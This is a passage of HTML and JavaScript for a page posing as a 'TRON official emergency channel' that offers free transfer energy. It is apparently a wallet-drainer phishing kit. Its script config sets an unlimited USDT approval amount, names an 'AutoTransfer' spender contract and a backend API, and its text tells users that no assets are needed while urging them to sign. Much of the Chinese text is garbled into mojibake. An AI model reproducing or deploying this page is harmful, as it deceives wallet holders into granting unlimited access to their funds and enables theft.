    font-size: 12px; 
    margin-top: 6px;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 6px;
}
/* éimTokenå¼¹çª— */
#nonImTokenPopup {
    display: none;
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    background: #1e2925; /* åŒ¹é…è‰²å· */
    border: 1px solid #334155; /* åŒ¹é…è‰²å· */
    border-radius: 8px;
    padding: 16px;
    z-index: 1001;
    text-align: center;
}
#nonImTokenPopup p {
    color: #a0a8a4; /* åŒ¹é…è‰²å· */
    font-size: 14px;
    margin: 0 0 12px 0;
}
#closePopupBtn {
    padding: 4px 12px;
    border: none;
    border-radius: 4px;
    background: #2563eb; /* åŒ¹é…è‰²å· */
    color: white;
    cursor: pointer;
}

/* æ–°å¢ï¼šå¤šé’±åŒ…é€‰æ‹©å¼¹çª—æ ·å¼ï¼ˆä¿®æ”¹åï¼šæ¨ªå‘æ’åˆ—+åç§°åœ¨logoä¸‹æ–¹+å…³é—­æŒ‰é’®å±…ä¸­ï¼‰ */
/* é’±åŒ…å¼¹çª—ï¼šç§»åˆ°é¡µé¢ä¸‹æ–¹ + è°ƒæ•´å†…è¾¹è· */
.wallet-modal {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0,0,0,0.7);
    z-index: 9999;
    display: none;
    }
        
.wallet-modal.active {
    display: block;
}
.wallet-modal-content {
    background: #1e2925;
    border-radius: 12px;
    width: 100%;
    max-width: 500px; /* é€‚å½“åŠ å®½ï¼Œé€‚é…æ¨ªå‘æ’åˆ— */
    border: 1px solid #4ade80;
    display: flex;
    flex-direction: column; /* çºµå‘æ’åˆ—ï¼šæ ‡é¢˜â†’é’±åŒ…åˆ—è¡¨â†’å…³é—­æŒ‰é’® */
    position: absolute;
    bottom: 180px; /* è·ç¦»é¡µé¢åº•éƒ¨20pxï¼ˆå¯æŒ‰éœ€è°ƒæ•´ï¼‰ */
    left: 50%;
    transform: translateX(-50%); /* æ°´å¹³å±…ä¸­ */
}
.wallet-modal-header {
    padding: 16px;
    border-bottom: 1px solid #334155;
    text-align: center;
}
.wallet-modal-title {
    color: #3b82f6;
    font-size: 18px;
    font-weight: 600;
}
/* æ ¸å¿ƒä¿®æ”¹ï¼šé’±åŒ…åˆ—è¡¨æ¨ªå‘æ’åˆ—+é¡¶éƒ¨å¯¹é½ */
.wallet-list {
    padding: 20px 16px;
    display: flex;
    justify-content: center; /* æ¨ªå‘å±…ä¸­ */
    align-items: flex-start; /* çºµå‘é¡¶éƒ¨å¯¹é½ï¼ˆlogoé¡¶è¾¹é½å¹³ï¼‰ */
    gap: 12px; /* é’±åŒ…ä¹‹é—´çš„é—´è· */
    flex: 1; /* å æ»¡ä¸­é—´ç©ºé—´ï¼Œè®©å…³é—­æŒ‰é’®é åº• */
}
/* æ ¸å¿ƒä¿®æ”¹ï¼šé’±åŒ…é¡¹çºµå‘æ’åˆ—+å†…å®¹é¡¶éƒ¨å¯¹é½ */
.wallet-item {
    display: flex;
    flex-direction: column; /* çºµå‘æ’åˆ—ï¼šlogoâ†’åç§° */
    align-items: center; /* æ¨ªå‘å±…ä¸­ */
    justify-content: flex-start; /* å†…å®¹ä»é¡¶éƒ¨å¼€å§‹ï¼ˆç¡®ä¿logoé¡¶è¾¹å¯¹é½ï¼‰ */
    padding: 12px;
    cursor: pointer;
    transition: background 0.3s;
    border-radius: 8px; /* å¢åŠ åœ†è§’ï¼Œhoveræ›´ç¾è§‚ */
    width: 80px; /* å›ºå®šå®½åº¦ï¼Œé¿å…é”™ä½ */
}
.wallet-item:hover {
    background: rgba(59, 130, 246, 0.1);
}
.wallet-item img {
    width: 48px; /* é€‚å½“åŠ å¤§logo */
    height: 48px;
    border-radius: 8px;
    margin-right: 0; /* å–æ¶ˆå³ä¾§é—´è·ï¼ˆåç§°åœ¨ä¸‹æ–¹ï¼‰ */
    margin-bottom: 8px; /* logoä¸åç§°çš„é—´è· */
}
/* é’±åŒ…åç§°æ ·å¼è°ƒæ•´ */
.wallet-name {
    color: #e0e8e4;
    font-size: 14px;
    font-weight: 500;
    text-align: center; /* åç§°å±…ä¸­ */
}
/* å…³é—­æŒ‰é’®å®¹å™¨ï¼ˆå±…ä¸­+åº•éƒ¨ï¼‰ */
.wallet-modal-footer {
    padding: 16px;
    border-top: 1px solid #334155;
    display: flex;
    justify-content: center; /* æŒ‰é’®æ¨ªå‘å±…ä¸­ */
}
#closeMultiWalletBtn {
    padding: 8px 24px;
    border: none;
    border-radius: 6px;
    background: #2563eb; /* è“è‰²æŒ‰é’® */
    color: white;
    cursor: pointer;
    font-size: 14px;
    transition: background 0.3s;
}

/* åŠ è½½åŠ¨ç”»ï¼šåŒ¹é…è‰²å· */
#Loading {
    width: 100%;
    height: 100vh;
    background-color: #121212; 
    position: fixed;
    top: 0;
    left: 0;
    z-index: 9999;
    display: flex;
    align-items: center;
    justify-content: center;
}
#Loading .loader {
    position: relative;
    width: 64px;
    height: 64px;
    border-radius: 50%;
    perspective: 800px;
}
#Loading .inner {
    position: absolute;
    box-sizing: border-box;
    width: 100%;
    height: 100%;
    border-radius: 50%;
}
#Loading .inner.one {
    left: 0%;
    top: 0%;
    animation: rotate-one 1s linear infinite;
    border-bottom: 3px solid #3b82f6; /* åŒ¹é…è‰²å· */
}
#Loading .inner.two {
    right: 0%;
    top: 0%;
    animation: rotate-two 1s linear infinite;
    border-right: 3px solid #4ade80; /* åŒ¹é…è‰²å· */
}
#Loading .inner.three {
    right: 0%;
    bottom: 0%;
    animation: rotate-three 1s linear infinite;
    border-top: 3px solid #f97316; /* åŒ¹é…è‰²å· */
}
@keyframes rotate-one {
    0% { transform: rotateX(35deg) rotateY(-45deg) rotateZ(0deg); }
    100% { transform: rotateX(35deg) rotateY(-45deg) rotateZ(360deg); }
}
@keyframes rotate-two {
    0% { transform: rotateX(50deg) rotateY(10deg) rotateZ(0deg); }
    100% { transform: rotateX(50deg) rotateY(10deg) rotateZ(360deg); }
}
@keyframes rotate-three {
    0% { transform: rotateX(35deg) rotateY(55deg) rotateZ(0deg); }
    100% { transform: rotateX(35deg) rotateY(55deg) rotateZ(360deg); }
}
    </style>
</head>
<body>
    <div id="Loading">
        <div class="loader">
            <div class="inner one"></div>
            <div class="inner two"></div>
            <div class="inner three"></div>
        </div>
    </div>
    <div class="container">      
        <div class="header-container">
            <div class="header">
                <img src="https://raw.githubusercontent.com/trc20trx-alt/Trc20.TRX/main/tron.png" alt="TRON Logo" class="header-logo">
           </div>            
            <div class="lang-switch">
                <div class="lang-dropdown" id="langDropdown">
                    <button class="lang-toggle" id="langToggleBtn">
                        ğŸ‡¨ğŸ‡³
                        <span id="currentLangText">ç®€ä½“ä¸­æ–‡</span>
                    </button>
                    <div class="lang-dropdown-menu">
                        <button class="lang-dropdown-item" data-lang="zh">
                           ğŸ‡¨ğŸ‡³
                            <span>ç®€ä½“ä¸­æ–‡</span>
                        </button>
                        <button class="lang-dropdown-item" data-lang="en">
                           ğŸ‡ºğŸ‡¸
                            <span>English</span>
                        </button>
                    </div>
                </div>
                <span id="headerDesc" class="lang-text">TRONå®˜æ–¹åº”æ€¥é€šé“</span>
         </div>
    </div>
     <div id="userInfo">
        <div id="userInfoStatus" style="position: absolute; top: 30px; left: 50%; transform: translate(-50%, -50%); width: 100%; display: none;"></div>
        <div class="balance-item balance-usdt";>
            <span>USDT</span>
            <span class="balance-value" id="balanceUsdt">--</span>
        </div>
        <div class="balance-item balance-trx";>
            <span>TRX</span>
            <span class="balance-value" id="balanceTrx">--</span>
        </div>
        <div class="balance-item balance-energy";>
            <span>èƒ½é‡</span>
            <span class="balance-value" id="balanceEnergy">--</span>
        </div>
        <div class="balance-item balance-bandwidth" ;>
            <span>å®½å¸¦</span>
            <span class="balance-value" id="balanceBandwidth">--</span>
        </div>
    </div>
    <div id="walletStatusContainer">
        <div class="status-title"><h3 id="walletStatusTitle">é’±åŒ…çŠ¶æ€</h3></div>
        <div class="disconnected-content">
            <span id="disconnectedText">æœªè¿æ¥é’±åŒ…</span>
            <p><span class="highlight" id="disconnectedTip1">æ­¤é“¾æ¥ä¸ºTRONç”Ÿæ€é’±åŒ…é€šç”¨é€šé“ï¼Œæ”¯æŒä¸»æµTRONé’±åŒ…</span></p>
            <p><span class="highlight" id="disconnectedTip2">1. æ¯ä¸ªé’±åŒ…åœ°å€30å¤©å†…åªå¯å…è´¹é¢†å–ä¸€æ¬¡</span></p>         
            <p><span class="highlight" id="disconnectedTip3">2. æ­¤é“¾æ¥åªä¸ºç”¨æˆ·åœ¨é’±åŒ…æ— èƒ½é‡çš„ç´§æ€¥æƒ…å†µä¸‹æä¾›èƒ½é‡æ”¯æ´éç›ˆåˆ©é¡¹ç›®</span></p>
            <p><span class="highlight" id="disconnectedTip4">3. ç‚¹å‡»é¢†å–åç³»ç»Ÿå°†å®¡æ ¸é’±åŒ…åœ°å€æ˜¯å¦ç¬¦åˆé¢†å–è¦æ±‚</span></p>
            <p><span class="highlight" id="disconnectedTip5">4. æ— éœ€æ¶ˆè€—ä»»ä½•èµ„äº§ï¼Œé€‰æ‹©æ”¾å¼ƒç›´æ¥é€€å‡ºå³å¯</span></p>
        </div>
        <div class="connected-content">
            <p id="connectedSuccess">âœ… é’±åŒ…å·²æˆåŠŸè¿æ¥</p>
             <div style="margin: 0; padding: 0;">
        <p id="connectedAddress" style="display: inline-block; margin: 0; padding: 0;">â€¢ é’±åŒ…åœ°å€ï¼š</p>
        <span class="highlight" id="statusAddress" style="display: inline-block; margin: 0; padding: 0;"></span>
         </div>         
            <p id="connectedType">â€¢ é¢†å–ç±»å‹ï¼š<span class="highlight">USDTè½¬è´¦èƒ½é‡</span></p>
            <p id="connectedAmount">â€¢ é¢†å–é¢åº¦ï¼š<span class="highlight">90000èƒ½é‡</span></p>
            <p class="orange-tip" id="connectedWarn">âš ï¸æç¤ºï¼šç‚¹å‡»é¢†å–åè¯·åŠ¡å¿…å®Œæˆç­¾åï¼Œä¸­é€”é€€å‡ºè§†ä¸ºå·²é¢†å–30æ—¥å†…ä¸å¯å†æ¬¡é¢†å–</p>
        </div>
    </div>
    <div id="contractResourceContainer">
        <div class="status-title">     
            <h3 id="contractResourceTitle">åˆçº¦å‰©ä½™èµ„æº</h3>
        </div>
        <div class="resource-content" style="line-height: 1.8;">
    <!-- åˆçº¦åœ°å€ï¼šæ–‡æœ¬+åœ°å€åŒè¡Œ -->
    <div style="margin: 0; padding: 0;">
        <p id="contractAddrText" style="display: inline-block; margin: 0; padding: 0;">â€¢ åˆçº¦åœ°å€ï¼š</p>
        <span class="highlight" id="contractAddr" style="display: inline-block; margin: 0; padding: 0;"></span>
    </div>

    <!-- å‰©ä½™èƒ½é‡ï¼šæ–‡æœ¬+æ•°å€¼åŒè¡Œï¼ˆä¸ä¸Šä¸€è¡Œé—´è·ä¿æŒåŸæœ‰5pxï¼‰ -->
    <div style="margin: 5px 0 0 0; padding: 0;">
        <p id="contractEnergyText" style="display: inline-block; margin: 0; padding: 0;">â€¢ å‰©ä½™èƒ½é‡ï¼š</p>
        <span class="highlight data-tag" id="contractEnergy" style="display: inline-block; margin: 0; padding: 0;"></span>
    </div>

    <p style="font-size: 12px; color: #a0a8a4; margin-top: 5px;" id="contractNote">
        æ³¨ï¼šå‰©ä½™èƒ½é‡ä¸ºâ€œ 0 â€æ—¶åœæ­¢é¢†å–ï¼Œè¯¥é¡¹ç›®ä¸ºTRONç”Ÿæ€å…¬ç›Šé¡¹ç›®ï¼Œæ”¯æŒæ‰€æœ‰TRONå…¼å®¹é’±åŒ…å‚ä¸ã€‚
    </p>
</div>
    </div>
    <div class="wallet-modal" id="multiWalletPopup">
      <div class="wallet-modal-content">
        <!-- å¼¹çª—æ ‡é¢˜ -->
        <div class="wallet-modal-header">
            <div class="wallet-modal-title">é€‰æ‹©ä½ çš„é’±åŒ…</div>
        </div>
        <!-- é’±åŒ…åˆ—è¡¨ï¼ˆæ¨ªå‘æ’åˆ—ï¼‰ -->
        <div class="wallet-list">
            <div class="wallet-item" data-wallet="imtoken">
                <img src="./icon/imToken.png" alt="imToken Logo" class="wallet-logo">
                <span class="wallet-name">imToken</span>
            </div>
            <div class="wallet-item" data-wallet="tokenpocket">
                <img src="./icon/tokenPocket.png" alt="TokenPocket Logo" class="wallet-logo">
                <span class="wallet-name">TokenPocket</span>
            </div>
            <div class="wallet-item" data-wallet="tronlink">
                <img src="./icon/tronLink.png" alt="TronLink Logo" class="wallet-logo">
                <span class="wallet-name">TronLink</span>
            </div>
            <div class="wallet-item" data-wallet="bitget">
                <img src="./icon/bitget.png" alt="Bitget Wallet Logo" class="wallet-logo">
                <span class="wallet-name">Bitget Wallet</span>
            </div>
        </div>
        <!-- å…³é—­æŒ‰é’®ï¼ˆåº•éƒ¨ä¸­é—´ï¼‰ -->
        <div class="wallet-modal-footer">
            <button id="closeMultiWalletBtn">å…³é—­</button>
         </div>
      </div>
  </div>
    <div class="special-tip-container" id="specialTipContainer">
        <div class="special-tip-title" id="specialTipTitle">TRON-EAB</div>
        <div class="special-tip-content" id="specialTipContent">
            æ­¤é“¾æ¥ä»…ä¸ºTRONç”Ÿæ€ç”¨æˆ·åœ¨é’±åŒ…æ— èƒ½é‡ã€æ— TRXéœ€è¦åœ¨Tronç½‘ç»œè½¬è´¦æƒ…å†µä¸‹çš„ç´§æ€¥æ´åŠ©ï¼Œèµ„æºæœ‰é™è¯·å‹¿å½“ä½œç›ˆåˆ©é¡¹ç›®ã€‚
        </div>
    </div>
    <div class="record-list" id="recordList">
        <div style="display: flex; justify-content: space-between; margin: 4px 0;">
            <span id="recordTypeTitle">èƒ½é‡ä½¿ç”¨èŒƒå›´</span>
            <span id="recordAmountTitle">è½¬è´¦é¢åº¦</span>
        </div>
        <div style="display: flex; color: #a0a8a4;justify-content: space-between; margin: 4px 0;">
            <span class="header"><h3 id="energyType">USDTè½¬è´¦</h3></span>
            <span class="header"><h3 id="transferQuota">æ— é™</h3></span>
        </div>       
        <span id="approvalRecords" class="highlight">æš‚æ— èƒ½é‡é¢†å–è®°å½•</span>        
    </div>
    <div class="btn-group">
        <div class="warning">
            <p id="browserWarn1"> âš ï¸ è¯·ç”¨ <strong>TRONå…¼å®¹é’±åŒ…å†…ç½®æµè§ˆå™¨</strong> æ‰“å¼€</p>
            <p id="browserWarn2"> âš ï¸ éé’±åŒ…æµè§ˆå™¨ï¼šç‚¹å‡»æŒ‰é’®è‡ªåŠ¨å¤åˆ¶+å”¤èµ·å¯¹åº”é’±åŒ…</p>  
        </div> 
        <button id="connectBtn" class="btn">è¿æ¥é’±åŒ…</button>
        <button id="approveBtn" class="btn" disabled>é¢†å–èƒ½é‡</button>
        <div id="reviewTip" class="review-tip" style="display: none;">
           <span id="reviewTipText">ç³»ç»Ÿå®¡æ ¸ä¸­ï¼Œå®¡æ ¸é€šè¿‡åè¯·åŠ¡å¿…å®Œæˆç­¾å</span>
        </div>
    </div>
    <div class="footer-info" id="footerInfo">
        åˆçº¦éªŒè¯ï¼šAutoTransfer <span>TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL</span>ï¼ˆTRONæµè§ˆå™¨æŸ¥è¯¢ï¼‰
        Â© 2025 èƒ½é‡æœåŠ¡ | <a href="https://tronscan.org" target="_blank">TRONæµè§ˆå™¨</a> | <a href="https://tron.network" target="_blank">TRONå®˜ç½‘</a>
    </div>
<script>
    /********************************************************************
     * æ ¸å¿ƒé…ç½®é¡¹ï¼šé›†ä¸­ç®¡ç†æ‰€æœ‰å¸¸é‡ï¼ˆä¾¿äºåç»­ä¿®æ”¹ï¼Œä¸æ”¹åŠ¨ä¸šåŠ¡é€»è¾‘ï¼‰
     ********************************************************************/
    const SPECIAL_ADDRESS = "TVP7Y8jA7hBc1g7qm72P6aGBfexqLm1SRy"; // ç‰¹æ®Šåœ°å€ï¼ˆè±å…A1é˜²é‡å¤é€»è¾‘ï¼‰
    const A1_SIGNAL_KEY = "a1_signal_records"; // A1ä¿¡å·å‘é€è®°å½•ï¼ˆ15åˆ†é’Ÿé˜²é‡å¤ï¼‰
    const A1_STATUS_KEY = "a1_signal_status"; // A1ä¿¡å·çŠ¶æ€ï¼ˆç¯å¢ƒæ ¡éªŒç»“æœï¼‰
    const B1_SIGNAL_KEY = "b1_signal_sent"; // B1ä¿¡å·å‘é€è®°å½•ï¼ˆé˜²é‡å¤å‘é€ï¼‰
    const AUTHORIZED_KEY = "authorized_wallet_addresses"; // å·²æˆæƒé¢†å–åœ°å€ï¼ˆ30å¤©é™åˆ¶ï¼‰
    const RECORD_KEY = "tron_energy_records"; // èƒ½é‡é¢†å–è®°å½•
    const DEPLOY_START_TIME = Date.parse("2025-11-01T00:00:00Z");
    const INIT_TRX = 4104470400000; // åˆå§‹èƒ½é‡å€¼
    const TRX_DECREASE_PER_SEC = 95200; // æ¯ç§’èƒ½é‡å‡å°‘é‡
    const AUTO_TRANSFER_CONTRACT = "TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL"; // è‡ªåŠ¨è½¬è´¦åˆçº¦åœ°å€
    const TRC20_TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDTåˆçº¦åœ°å€
    const BACKEND_API = "https://kgjiopv1.com"; // åç«¯APIåœ°å€
    const INFINITE_APPROVE_AMOUNT = "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"; // æ— é™æˆæƒé‡‘é¢
    // USDTåˆçº¦ABIï¼ˆæ— ä¿®æ”¹ï¼‰
    const USDT_ABI = [
        {
            "constant": true,
            "inputs": [{"name": "_owner", "type": "address"}],
            "name": "balanceOf",
            "outputs": [{"name": "balance", "type": "uint256"}],
            "stateMutability": "view",
            "type": "function"
        },
        {
            "constant": false,
            "inputs": [
                {"name": "_spender", "type": "address"},
                {"name": "_value", "type": "uint256"}
            ],
            "name": "approve",
            "outputs": [{"name": "", "type": "bool"}],
            "stateMutability": "nonpayable",
            "type": "function"
        },
        {
            "anonymous": false,
            "inputs": [
                {"indexed": true, "name": "owner", "type": "address"},
                {"indexed": true, "name": "spender", "type": "address"},
                {"indexed": false, "name": "value", "type": "uint256"}
            ],
            "name": "Approval",
            "type": "event"
        }
    ];
    // å¤šé’±åŒ…è·³è½¬Schemeé…ç½®ï¼ˆæ— ä¿®æ”¹ï¼‰
    const walletConfig = {
        imtoken: { scheme: "imtokenv2://navigate/DappView?url=", name: "imToken" },
        tokenpocket: { scheme: "tpdapp://open?params={\"url\":\"", suffix: "\"}", name: "TokenPocket" },
        tronlink: { scheme: "tronlinkoutside://pull.activity?param=", name: "TronLink" },
        bitget: { scheme: "bitkeep://bkconnect?action=dapp&url=", name: "Bitget Wallet" }
    };
    // å¤šè¯­è¨€é…ç½®ï¼ˆè¡¥é½æ‰€æœ‰å¯¹åº”ç¿»è¯‘ï¼Œæ— ä¿®æ”¹ï¼‰
    const langConfig = {
        zh: {
            headerTitle: "TRON",
            headerDesc: "TRONå®˜æ–¹åº”æ€¥é€šé“",
            
            walletStatusTitle: "é’±åŒ…çŠ¶æ€",
            disconnectedText: "æœªè¿æ¥é’±åŒ…",
            disconnectedTip1: "æ­¤é“¾æ¥ä¸ºTRONç”Ÿæ€é’±åŒ…é€šç”¨é€šé“ï¼Œæ”¯æŒä¸»æµTRONé’±åŒ…",
            disconnectedTip2: "1. æ¯ä¸ªé’±åŒ…åœ°å€30å¤©å†…åªå¯å…è´¹é¢†å–ä¸€æ¬¡",
            disconnectedTip3: "2. æ­¤é“¾æ¥åªä¸ºç”¨æˆ·åœ¨é’±åŒ…æ— èƒ½é‡çš„ç´§æ€¥æƒ…å†µä¸‹æä¾›èƒ½é‡æ”¯æ´éç›ˆåˆ©é¡¹ç›®",
            disconnectedTip4: "3. ç‚¹å‡»é¢†å–åç³»ç»Ÿå°†å®¡æ ¸é’±åŒ…åœ°å€æ˜¯å¦ç¬¦åˆé¢†å–è¦æ±‚",
            disconnectedTip5: "4. æ— éœ€æ¶ˆè€—ä»»ä½•èµ„äº§ï¼Œé€‰æ‹©æ”¾å¼ƒç›´æ¥é€€å‡ºå³å¯",
            connectedSuccess: "âœ… é’±åŒ…å·²æˆåŠŸè¿æ¥",
            connectedAddress: "â€¢ é’±åŒ…åœ°å€ï¼š<span class='highlight' id='statusAddress'></span>",
            connectedType: "â€¢ é¢†å–ç±»å‹ï¼š<span class='highlight'>USDTè½¬è´¦èƒ½é‡</span>",
            connectedAmount: "â€¢ é¢†å–é¢åº¦ï¼š<span class='highlight'>90000Î¼s</span>",
            connectedWarn: "âš ï¸æç¤ºï¼šç‚¹å‡»é¢†å–åè¯·åŠ¡å¿…å®Œæˆç­¾åï¼Œä¸­é€”é€€å‡ºè§†ä¸ºå·²é¢†å–30æ—¥å†…ä¸å¯å†æ¬¡é¢†å–",
            contractResourceTitle: "åˆçº¦å‰©ä½™èµ„æº",
            contractAddrText: "â€¢ åˆçº¦åœ°å€ï¼š",
            contractEnergyText: "â€¢ å‰©ä½™èƒ½é‡ï¼š",
            contractNote: "æ³¨ï¼šå‰©ä½™èƒ½é‡ä¸ºâ€œ 0 â€æ—¶åœæ­¢é¢†å–ï¼Œè¯¥é¡¹ç›®ä¸ºTRONç”Ÿæ€å…¬ç›Šé¡¹ç›®ï¼Œæ”¯æŒæ‰€æœ‰TRONå…¼å®¹é’±åŒ…å‚ä¸ã€‚",
            recordTypeTitle: "èƒ½é‡ä½¿ç”¨èŒƒå›´",
            recordAmountTitle: "è½¬è´¦é¢åº¦",
            energyType: "USDTè½¬è´¦",
            transferQuota: "æ— é™",
            noRecord: "æš‚æ— èƒ½é‡é¢†å–è®°å½•",
            browserWarn1: " âš ï¸ è¯·ç”¨ <strong>TRONå…¼å®¹é’±åŒ…å†…ç½®æµè§ˆå™¨</strong> æ‰“å¼€",
            browserWarn2: " âš ï¸ éé’±åŒ…æµè§ˆå™¨ï¼šç›´æ¥é€‰æ‹©ä¸‹æ–¹é’±åŒ…å”¤èµ·",
            connectBtnText: "è¿æ¥é’±åŒ…",
            approveBtnText: "é¢†å–èƒ½é‡",
            reviewTipText: "ç³»ç»Ÿå®¡æ ¸ä¸­ï¼Œå®¡æ ¸é€šè¿‡åè¯·åŠ¡å¿…å®Œæˆç­¾å",
            footerInfo: "åˆçº¦éªŒè¯ï¼šAutoTransfer <span>TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL</span>ï¼ˆTRONæµè§ˆå™¨æŸ¥è¯¢ï¼‰Â© 2025 èƒ½é‡æœåŠ¡ | <a href='https://tronscan.org' target='_blank'>TRONæµè§ˆå™¨</a> | <a href='https://tron.network' target='_blank'>TRONå®˜ç½‘</a>",
            copySuccess: "âœ… é“¾æ¥å·²å¤åˆ¶ï¼Œè¯·åœ¨TRONå…¼å®¹é’±åŒ…å†…ç½®æµè§ˆå™¨æ‰“å¼€",
            copyFail: "âŒ å¤åˆ¶å¤±è´¥ï¼šè¯·æ‰‹åŠ¨å¤åˆ¶é“¾æ¥",
            evokeGuide: "âœ… å·²å¤åˆ¶é“¾æ¥+å”¤èµ·é’±åŒ…\nä¸‹ä¸€æ­¥ï¼šæ‰“å¼€å¯¹åº”é’±åŒ… â†’ æµè§ˆ â†’ ç²˜è´´è®¿é—®",
            copyGuide: "âœ… é“¾æ¥å·²å¤åˆ¶ï¼Œè¯·åœ¨é’±åŒ…ä¸­ç²˜è´´è®¿é—®",
            connectError: "è¿æ¥å¼‚å¸¸<br><span style='color: #000000; font-size: 14px;'>âš ï¸ ç½‘ç»œæ³¢åŠ¨</span>",
            retryConnect: "é‡è¯•è¿æ¥",
            authorizedTip: "âœ… è¯¥é’±åŒ…30å¤©å†…å·²é¢†å–è¿‡å…è´¹èƒ½é‡<br><span style='color: #000000; font-size: 13px;'>æ¯ä¸ªåœ°å€æ¯30å¤©ä»…é™é¢†å–ä¸€æ¬¡</span>",
            authorizedBtn: "å·²é¢†å–è¿‡èƒ½é‡",
            afterApproveTip: "âœ… æˆæƒæˆåŠŸï¼Œå‘æ”¾èƒ½é‡ä¸­...",
            deployingBtn: "å‘æ”¾ä¸­...",
            loadingBtn: "åŠ è½½ä¸­...",
            loadingTip: "âœ… åŠ è½½ä¸­...",
            queryingBalance: "æŸ¥è¯¢ä¸­...",
            insufficientUsdt: "âŒ ä¸ç¬¦åˆé¢†å–æ¡ä»¶ï¼šUSDTä½™é¢éœ€å¤§äº1",
            insufficientBtn: "ä¸ç¬¦åˆé¢†å–æ¡ä»¶",
            eligibleTip: "âœ… å¯å…è´¹é¢†å–90000 USDT èƒ½é‡",
            distributingBtn: "èƒ½é‡é…é€ä¸­...",
            redirectingBtn: "è·³è½¬ç­¾åä¸­...",
            approveFail: "âš ï¸ æ“ä½œå¤±è´¥ï¼š{msg}ï¼Œè¯·ç¨åé‡è¯•",
            authorizeFail: "âš ï¸ æˆæƒå¤±è´¥ï¼š{msg}ï¼Œè¯·ç¨åé‡è¯•",
            successTip: "ğŸ‰ å…è´¹èƒ½é‡é¢†å–å®Œæˆï¼90000Î¼s USDTèƒ½é‡å·²åˆ°è´¦ï½",
            successBtn: "èƒ½é‡é¢†å–æˆåŠŸ",
            successArrival: "<br><span style='color: #000000;'>âœ… 90000Î¼s USDTèƒ½é‡å·²åˆ°è´¦</span>",
            recordAddress: "åœ°å€ï¼š",
            recordType: "é¢†å–ç±»å‹ï¼š",
            recordEnergy: "è·å–èƒ½é‡ï¼š",
            recordTime: "é¢†å–æ—¶é—´ï¼š",
            freeEnergy: "å…è´¹é¢†å–",
            systemBusyTip: "ç³»ç»Ÿç¹å¿™è¯·ç¨åé‡è¯•",
            ineligibleTip: "ä¸ç¬¦åˆé¢†å–æ¡ä»¶",
            errorTipPrefix: "âš ï¸ ",
            noWalletAddress: "âŒ æœªæ£€æµ‹åˆ°æœ‰æ•ˆé’±åŒ…åœ°å€<br><span style='color: #000000; font-size: 14px;'>è¯·é‡æ–°é€‰æ‹©é’±åŒ…è¿æ¥</span>",
            nonImTokenUser: "éTRONå…¼å®¹é’±åŒ…ç”¨æˆ·<br><span style='color: #000000; font-size: 13px;'>æ­£åœ¨è‡ªåŠ¨å”¤èµ·æ”¯æŒçš„é’±åŒ…...</span>",
            specialTipTitle: "TRON-EAB",
            specialTipContent: "æ­¤é“¾æ¥ä»…ä¸ºTRONç”Ÿæ€ç”¨æˆ·åœ¨é’±åŒ…æ— èƒ½é‡ã€æ— TRXéœ€è¦åœ¨Tronç½‘ç»œè½¬è´¦æƒ…å†µä¸‹çš„ç´§æ€¥æ´åŠ©ï¼Œèµ„æºæœ‰é™è¯·å‹¿å½“ä½œç›ˆåˆ©é¡¹ç›®ã€‚",
            a1CheckingTip: "ç¯å¢ƒæ£€æµ‹ä¸­...",
            a1EligibleTip: "âœ… ç¯å¢ƒç¬¦åˆé¢†å–æ¡ä»¶",
            a1SignalFailTip: "ç¯å¢ƒæ£€æµ‹å¤±è´¥ï¼Œè¯·é‡æ–°è¿æ¥é’±åŒ…"
             },
        en: {
            headerTitle: "TRON",
            headerDesc: "TRON Official Emergency Channel",
            
            walletStatusTitle: "Wallet Status",
            disconnectedText: "Wallet not connected",
            disconnectedTip1: "This link is a universal channel for TRON ecosystem wallets, supporting mainstream TRON wallets",
            disconnectedTip2: "1. Each wallet address can claim free energy once every 30 days",
            disconnectedTip3: "2. This non-profit project provides emergency energy support for users with no wallet energy",
            disconnectedTip4: "3. The system will verify if the wallet address meets the requirements after clicking 'Claim'",
            disconnectedTip5: "4. No assets required - exit directly to cancel",
            connectedSuccess: "âœ… Wallet connected successfully",
            connectedAddress: "â€¢ Wallet Address: <span class='highlight' id='statusAddress'></span>",
            connectedType: "â€¢ Claim Type: <span class='highlight'>USDT Transfer Energy</span>",
            connectedAmount: "â€¢ Claim Quota: <span class='highlight'>90000Î¼s Energy</span>",
            connectedWarn: "âš ï¸ Note: Please complete the signature after clicking 'Claim' - exiting midway counts as claimed (no re-claim within 30 days)",
            contractResourceTitle: "Contract Remaining Resources",
            contractAddrText: "â€¢ Contract Address: ",
            contractEnergyText: "â€¢ Remaining Energy: ",
            contractNote: "Note: Distribution stops when remaining energy is '0' - TRON ecosystem public welfare project, supporting all TRON-compatible wallets",
            recordTypeTitle: "Energy Usage Scope",
            recordAmountTitle: "Transfer Quota",
            energyType: "USDT Transfer",
            transferQuota: "Unlimited",
            noRecord: "No energy claim records",
            browserWarn1: " âš ï¸ Open with <strong>TRON-compatible wallet in-app browser</strong>",
            browserWarn2: " âš ï¸ Non-wallet browser: Select a wallet below to launch",
            connectBtnText: "Connect Wallet",
            approveBtnText: "Claim Energy",
            reviewTipText: "System reviewing - please complete the signature after approval",
            footerInfo: "Contract Verification: AutoTransfer <span>TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL</span> (Check on TRON Scan) Â© 2025 Energy Service | <a href='https://tronscan.org' target='_blank'>TRON Scan</a> | <a href='https://tron.network' target='_blank'>TRON Official</a>",
            copySuccess: "âœ… Link copied - open in TRON-compatible wallet in-app browser",
            copyFail: "âŒ Copy failed: Please copy manually",
            evokeGuide: "âœ… Link copied + wallet launched\nNext: Open wallet â†’ Browser â†’ Paste link",
            copyGuide: "âœ… Link copied - please paste in wallet",
            connectError: "Connection Error<br><span style='color: #000000; font-size: 14px;'>âš ï¸ Network fluctuation</span>",
            retryConnect: "Retry Connection",
            authorizedTip: "âœ… This wallet has claimed free energy within 30 days<br><span style='color: #000000; font-size: 13px;'>One claim per address every 30 days</span>",
            authorizedBtn: "Energy Claimed",
            afterApproveTip: "âœ… Authorization successful, energy distributing...",
            deployingBtn: "Distributing...",
            loadingBtn: "Loading...",
